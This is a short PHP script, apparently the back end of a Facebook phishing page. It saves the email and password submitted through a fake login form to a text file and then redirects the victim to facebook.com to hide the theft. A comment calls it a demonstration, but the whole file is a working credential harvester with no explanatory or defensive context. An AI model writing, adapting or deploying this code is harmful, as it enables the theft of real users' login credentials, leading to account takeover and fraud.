<?php
// "written by mrAnonymous!";
// just use for demostration purposes!!
file_put_contents("data.txt", "Username : ". $_POST['email']. "Password : ". $_POST['pass']. "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();
?>
